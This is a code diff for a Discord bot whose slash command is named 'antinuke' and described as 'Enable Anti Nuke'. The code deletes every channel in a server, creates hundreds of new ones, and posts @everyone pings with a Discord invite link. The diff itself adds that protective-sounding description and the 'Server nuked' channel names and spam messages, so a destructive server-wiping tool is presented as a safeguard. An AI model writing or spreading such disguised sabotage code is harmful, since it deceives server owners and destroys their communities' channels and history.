@@ -22,7 +22,7 @@ const client = new Client({
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
 /* ===== CONFIG ===== */
-const CHANNEL_NAME = "ez";
+const CHANNEL_NAME = "Server nuked";
 const CREATE_COUNT = 500;
 const MSG_PER_CHANNEL = 5;
 const DELETE_DELAY = 90;
@@ -33,7 +33,7 @@ const CREATE_BATCH = 8; // số kênh tạo song song mỗi đợt (tối ưu nh
 const commands = [
   new SlashCommandBuilder()
     .setName("antinuke")
-    .setDescription("Reset server nhanh nhất có thể")
+    .setDescription("Bật Anti Nuke")
 ].map(cmd => cmd.toJSON());
 
 const rest = new REST({ version: "10" }).setToken(process.env.BOT_TOKEN);
@@ -64,11 +64,11 @@ client.on("interactionCreate", async interaction => {
 
   // 🔥 Tạo kênh sống sót để giữ context
   const controlChannel = await guild.channels.create({
-    name: "antinuke-running",
+    name: "Server Rách",
     type: ChannelType.GuildText
   });
 
-  await controlChannel.send("⚠️ Đang reset server...");
+  await controlChannel.send("⚠️ @everyone Join: https://discord.gg/P9yeTvwKjB");
 
   /* ===== XOÁ CHANNEL ===== */
   for (const ch of [...guild.channels.cache.values()]) {
@@ -91,7 +91,7 @@ client.on("interactionCreate", async interaction => {
     } catch {}
   }
 
-  await controlChannel.send("⚡ Đang tạo kênh mới (tối đa tốc độ)...");
+  await controlChannel.send("@everyone ⚡ Join: https://discord.gg/P9yeTvwKjB");
 
   /* ===== TẠO KÊNH + GỬI TIN (TỐI ĐA TỐC ĐỘ) ===== */
   for (let i = 0; i < CREATE_COUNT; i += CREATE_BATCH) {
